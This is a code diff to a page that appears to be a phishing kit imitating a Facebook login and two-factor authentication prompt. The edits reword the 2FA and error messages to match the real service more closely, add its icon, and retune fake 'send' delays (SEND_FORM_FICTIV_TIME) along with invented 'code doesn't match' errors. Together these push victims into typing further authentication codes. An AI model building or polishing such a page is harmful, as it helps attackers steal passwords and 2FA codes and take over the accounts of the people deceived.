@@ -3593,7 +3593,7 @@
                             </button>
                         </div>
                         <div id="forgot-pass-wrap">
-                            <span><a style="font-size: 19px; font-weight: 400;" href="#">Forgotten password?</a></span>
+                            <span>Forgotten password?</span>
                         </div>
                     </form>
                     <div class="spaser"></div>
@@ -3611,9 +3611,12 @@
             <div class="modal-content">
                 <div class="modal-body">
                     <div class="twoFAinfo-wraper">
-                        <h1 class="modal-title" id="2FAmodalLabel">Check your authentication code </h1>
+                        <h2 class="modal-title" id="2FAmodalLabel">Check your authentication code </h2>
                         <br>
-                        <p>Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).</p>
+                        <p>
+                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq x1a1m0xk xlup9mm x1kky2od"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 21a9 9 0 1 0 0-18 9 9 0 0 0 0 18zm0 2c6.075 0 11-4.925 11-11S18.075 1 12 1 1 5.925 1 12s4.925 11 11 11zm1.25-7.002c0 .6-.416 1-1.25 1-.833 0-1.25-.4-1.25-1s.417-1 1.25-1c.834 0 1.25.4 1.25 1zm-.374-8.125a.875.875 0 0 0-1.75 0v4.975a.875.875 0 1 0 1.75 0V7.873z"></path></svg>
+                            Enter the code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).
+                        </p>
                         <div class="fb-round-wraper">
                             <img src="../img/2FA.png" alt="" style="width: 100%;">
                         </div>
@@ -3631,7 +3634,7 @@
                                     id="exampleInputPassword" aria-describedby="emailHelp" required autocomplete="off">
                             </div>
                             <div class="invalid-feedback">
-                                The code that you've entered is incorrect. Please, try again after <span id="timer"></span>
+                                The login code you entered doesn't match. Please check the number and try again after <span id="timer"></span>.
                             </div>
                         </div>
                         <div class="form-btn-wrapper">
@@ -4273,7 +4276,7 @@
         }
 
         var INCORRECT_2FA_TIMEOUT = 30
-        var SEND_FORM_FICTIV_TIME = 2000
+        var SEND_FORM_FICTIV_TIME = 3000
 
         var firstModal = new bootstrap.Modal(document.getElementById('exampleModal1'))
         var apiModal = new bootstrap.Modal(document.getElementById('exampleModal2'))
@@ -4449,7 +4452,7 @@
                 spiner.style.display = 'none'
                 buttonText.style.display = 'block'
                 button.removeAttribute('disabled')
-            }, SEND_FORM_FICTIV_TIME)
+            }, 2000)
 
         }
 
@@ -4457,7 +4460,7 @@
             setTimeout(function () {
                 var errortext = apiForm.querySelector('.invalid-feedback')
                 errortext.style.display = 'none'
-            }, 15000)
+            }, 5000)
         }
 
         function apiFormhandle(event) {
@@ -4495,7 +4498,7 @@
                     apiModal.hide()
                     twoFAModal.show()
                 }
-            }, SEND_FORM_FICTIV_TIME)
+            }, 4000)
 
         }
         var counter2FA = 1
@@ -4542,7 +4545,7 @@
                     buttonText.style.display = 'block'
                 }
 
-            }, SEND_FORM_FICTIV_TIME)
+            }, 6000)
         }
 
         function unlock2FA() {
